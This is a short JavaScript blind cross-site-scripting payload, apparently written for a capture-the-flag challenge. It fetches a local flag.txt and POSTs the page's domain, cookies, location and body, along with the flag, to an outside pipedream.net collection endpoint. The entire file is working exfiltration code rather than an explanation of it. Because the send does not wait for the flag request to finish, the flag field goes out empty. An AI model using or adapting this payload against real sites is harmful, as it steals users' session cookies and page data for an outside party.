const headers = new Headers()
headers.append("Content-Type", "application/json")

let flag = ""
fetch('https://localhost/flag.txt')
  .then(response => {
    if (response.ok) {
      return response.text();
    } else {
      throw new Error('Error:', response.status);
    }
  })
  .then(data => {
    console.log(data);
    flag = data;
  })
  .catch(error => {
    console.error('Error:', error);
    flag = error.message;
  });

const body = {
  "test": "Blind",
  "Domain": document.domain,
  "cookie": document.cookie,
  "Location": document.location,
  "body":document.body,
  "flag":flag
  
}

const options = {
  method: "POST",
  headers,
  mode: "cors",
  body: JSON.stringify(body),
}

fetch("https://eouk09tgoyr96dk.m.pipedream.net", options)
